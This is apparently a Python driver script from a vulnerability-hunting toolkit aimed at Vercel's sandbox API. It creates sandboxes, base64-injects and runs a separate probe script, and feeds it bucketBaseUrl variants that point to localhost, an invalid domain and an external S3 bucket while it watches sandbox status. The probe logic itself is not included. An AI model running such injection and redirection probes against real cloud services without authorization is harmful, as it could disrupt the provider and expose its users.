# -*- coding: utf-8 -*-
"""v196 驱动: bucketBaseUrl 变体矩阵, 观测沙箱状态变化 + 进程存活"""
import sys, os, time, base64, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

USERP = r'D:\scan\skills\non-traditional-vuln-hunting\vda196_user.py'

VARIANTS = [
    ('v1vercel', 's3://v1.vercel.com/snap/x'),
    ('baddns', 's3://nonexistent-zzz-196.invalid/snap/x'),
    ('sbc-self', 's3://127.0.0.1:23456/snap/x'),
    ('s3aws', 's3://vercel-sandbox-probe-196.s3.us-east-1.amazonaws.com/snap/x'),
]


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def get_status():
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    try:
        j = json.loads(r)
        sb = j.get('sandbox', j)
        return sb.get('status'), sb.get('currentSnapshotId'), sb.get('statusUpdatedAt')
    except Exception:
        return None, None, (r or '')[:100]


def main():
    global NAME
    t0 = time.time()
    for tag, url in VARIANTS:
        NAME = 'v196' + tag
        print('========== VARIANT %s url=%s ==========' % (tag, url))
        api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        sid = fresh_sandbox(NAME)
        st0 = get_status()
        print('[pre status]', st0)
        inject(sid, '/vercel/sandbox/vda196_user.py', open(USERP, 'rb').read())
        c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda196_user.py', url], 90000)
        print('[run]', c)
        print((r or '')[:5000])
        time.sleep(5)
        st1 = get_status()
        print('[post status]', st1)
        # 若进程被杀的瞬间可能状态还没变, 再等 20s
        time.sleep(20)
        st2 = get_status()
        print('[post2 status]', st2)
        api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        print('--- variant done %.0fs ---' % (time.time() - t0))

    print('ALL DONE %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
